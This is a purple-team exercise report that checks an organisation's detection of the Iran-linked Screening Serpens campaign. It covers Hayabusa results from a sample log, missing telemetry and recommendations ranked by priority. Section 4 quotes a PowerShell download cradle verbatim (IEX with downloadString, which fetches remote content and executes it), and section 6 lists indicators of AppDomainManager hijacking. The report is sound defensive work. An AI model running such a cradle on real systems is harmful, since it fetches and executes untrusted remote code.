# Purple Team Exercise Report — Screening Serpens (UNC1549)

**Date:** 2026-07-19 · **Audience:** Detection engineering / SOC team
**Source intel:** [Unit 42 — Tracking Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
**Ready for Claude Desktop DOCX generation.**

---

## 1. Objective
Validate the organization's detection coverage against the Iran-nexus **Screening Serpens** campaign (active Feb–Apr 2026), which deploys the **MiniUpdate** and **MiniJunk V2** RAT families through recruitment-themed social engineering, DLL sideloading, and — for the first time — **AppDomainManager hijacking** to disable .NET security telemetry before payload execution.

## 2. Methodology
End-to-end purple-team loop:
1. **Threat intel ingest** — parsed the Unit 42 report; extracted 24 TTPs, 14 flagged "Simulate".
2. **Test planning** — mapped Simulate-priority techniques to Atomic Red Team tests (`atomic-mapper` agent).
3. **Execution** — sample-EVTX substitution (no dedicated lab per project constraints).
4. **Detection analysis** — scanned EVTX with Hayabusa 1.28.1 (`json-timeline`).
5. **SIEM validation** — authored Splunk SPL + KQL correlation queries.
6. **Gap analysis** — tested vs. detected, Hayabusa vs. SIEM, expected vs. actual telemetry.

## 3. What was tested
- **Sample:** `ID4103-4104-Payload-download-via-PowerShell.evtx`
- Represents **T1105 (Ingress Tool Transfer)** + **T1059.001 (PowerShell)** — a delivery proxy for the campaign's payload-download behavior.

## 4. Detection results (Hayabusa)

| Severity | Rule | Event ID | ATT&CK |
|----------|------|:--:|--------|
| **High** | Suspicious PowerShell Invocations - Specific | 4104 | T1059.001 / T1105 |
| Informational | PwSh Scriptblock (x2) | 4104 | T1059.001 |
| Informational | PwSh Pipeline Exec | 4103 | T1059.001 |

**High-severity payload:**
```
IEX(New-Object Net.WebClient).downloadString('https://miro.medium.com/max/1400/1*FnPDYeZVrGTbuE7Lj7JhgQ.png')
```
Host `fs03vuln.offsec.lan`, user `OFFSEC\admmig`.

## 5. Coverage assessment

- **Planned techniques:** 14 · **Validated:** 1 (~7%) · **Crown-jewel techniques validated:** 0 of 3.
- **Telemetry available:** `PowerShell/Operational` (4103/4104) only.
- **Telemetry missing:** Sysmon EID 7 (Image/Module Load — the marquee sideloading/AppDomainManager signal), Sysmon EID 13 (ETW/UAC registry), Security 4688/4698, TaskScheduler 106, WMI-Activity 11.

### Crown-jewel blind spot
The three techniques Unit 42 explicitly calls out for defenders had **no telemetry**:
- **T1574.014** AppDomainManager Hijacking (the report's signature evolution)
- **T1574.002** DLL Side-Loading
- **T1562.002** Impair Defenses: Disable ETW / Event Logging

## 6. Recommendations (prioritized)

1. **CRITICAL** — Acquire/forward **Sysmon (EID 7, 13)** and **Security (4688, 4698)** telemetry, then re-run the exercise to validate the crown-jewel techniques. Ensure Sysmon config does **not** suppress EID 7.
2. **HIGH** — Execute the staged SPL in the live SIEM; confirm PowerShell **script-block logging (4104)** is enabled and forwarded fleet-wide. Build a correlation rule for `IEX`+`downloadString` cradles if none exists.
3. **HIGH** — Fine-tune EDR to treat **DLL sideloading** and **AppDomainManager hijacking** as high-risk (signed binary loading untrusted module; `.exe.config` with `appDomainManagerType` / `etwEnable=false`).
4. **MEDIUM** — Verify the disputed Atomic Red Team IDs (`T1685`, `T1574.001`, `T1497.001`) against a real atomics checkout before any live execution.
5. **MEDIUM** — Manually reproduce the two techniques with no packaged atomic (T1574.014, T1027.001).

## 7. Exercise caveats
- **No dedicated lab** — sample-EVTX substitution per `CLAUDE.md`; live Atomic execution not performed.
- **Unverified Atomic IDs** — `atomic-mapper` ID remappings not confirmed against a local checkout; `T1685` for the ETW technique is likely incorrect.
- **SIEM step theoretical** — no live SIEM connection; queries staged for manual run.

## 8. Verdict
> The detection **pipeline is proven** end-to-end and caught a high-severity download-cradle. **Campaign coverage is not proven** — only ~7% of planned techniques and none of the crown jewels were validated, gated entirely by single-channel telemetry. The exercise's primary output is a clear, prioritized telemetry-acquisition gap.

## Appendix — artifacts
- `report.md` — full TTP analysis + Atomic test plan
- `findings.md` — IOCs (23 domains, 4 URLs, 13 hashes) + detection results
- `execution-checklist.md` — pre-flight, commands, EVTX export
- `siem-validation.md` — SPL / KQL queries
- `gap-analysis.md` — coverage matrix
- `evtx/` — scanned sample logs
